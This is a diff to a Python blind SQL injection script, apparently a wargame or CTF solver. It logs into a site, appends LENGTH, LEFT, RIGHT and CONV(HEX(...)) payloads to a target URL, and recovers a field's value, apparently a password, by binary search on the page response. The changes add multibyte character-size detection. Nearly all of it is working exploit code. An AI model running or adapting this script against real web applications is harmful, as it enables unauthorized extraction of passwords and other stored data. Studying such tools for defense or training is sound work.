@@ -1,6 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse
+import sys
 from getpass import getpass
 
 
@@ -22,22 +23,35 @@ def login(id, pw):
 
 def get_length(pwning_url, field, add_comment, login_cookies):
 
+    size_of_char = 1
     length = 1
+
+    print('Trying to get size of each CHAR by LENGTH, LEFT')
+    while True:
+        url = pwning_url + ' LENGTH(LEFT({0},1)) > {1} {2} '.format(field, size_of_char, '%23' if add_comment else '')
+        res = requests.get(url, cookies=login_cookies)
+        soup = BeautifulSoup(res.text, 'html.parser')
+        h2s = soup.find_all('h2')
+
+        if not h2s:
+            break
+
+        size_of_char += 1
+    print('Size of each CHAR is {0}'.format(size_of_char))
+
     while True:
         print('Trying to get length of {0} by length {1}'.format(field, length))
-        url = pwning_url + ' length({0}) > {1} {2} '.format(field, length, '%23' if add_comment else '')
+        url = pwning_url + ' LENGTH({0}) > {1} {2} '.format(field, length, '%23' if add_comment else '')
 
         # remove white space
         url = url.replace(' ', '')
-
-
         res = requests.get(url, cookies=login_cookies)
 
         soup = BeautifulSoup(res.text, 'html.parser')
         h2s = soup.find_all('h2')
 
         if not h2s:
-            return length
+            return int(length / size_of_char), size_of_char
 
         length += 1
 
@@ -45,24 +59,25 @@ def get_length(pwning_url, field, add_comment, login_cookies):
 def do_blind_inject_divide(pwning_url, field, add_comment, login_cookies):
 
     pw = str()
-    length = get_length(pwning_url, field, add_comment,login_cookies)
+    length, size_of_char = get_length(pwning_url, field, add_comment,login_cookies)
     idx = 1
     print('Success to get length {0} is {1} '.format(field, length))
     while idx <= length:
         print('Trying to get value index[{0}]'.format(idx))
-        min_ascii = 32
-        max_ascii = 127
+        min_ascii = 0
+        max_ascii = (2 ** (size_of_char * 8)) - 1  # To get maximum value of byte
+
         while True:
             # password must compare with int in mysql 'a' = 'A' is true
-            url = pwning_url + ' CHAR({2}) < BINARY(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
-
+            url = pwning_url + ' CONV(HEX(RIGHT(LEFT({0},{1}),1)), 16 , 10) > {2} {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
+            print( 'CONV(RIGHT(LEFT({0},{1}),1), 16 , 10) > {2} {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else ''))
             # remove white space
-            url = url.replace(' ', '')
+            # url = url.replace(' ', '')
 
             res = requests.get(url, cookies=login_cookies)
             soup = BeautifulSoup(res.text, 'html.parser')
             h2s = soup.find_all('h2')
-
+            print(h2s)
             if max_ascii == int((min_ascii + max_ascii) / 2) or min_ascii == int((min_ascii + max_ascii) / 2) :
                 if not h2s:
                     pw += chr(int((min_ascii + max_ascii) / 2))
@@ -93,6 +108,8 @@ def do_blind_inject_divide(pwning_url, field, add_comment, login_cookies):
 
 
 
+
+# don't care about this method
 
 def do_blind_inject_linear(pwning_url, field, add_comment, login_cookies):
 
@@ -150,7 +167,8 @@ if __name__ == '__main__':
     method = int(input('''Chosse 1 method
     1 : divide and conquer
     2 : linear 
-    default : divide first and do linear'''))
+    default : divide first and do linear
+    Ans : '''))
 
     if method == 1:
         do_blind_inject_divide(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
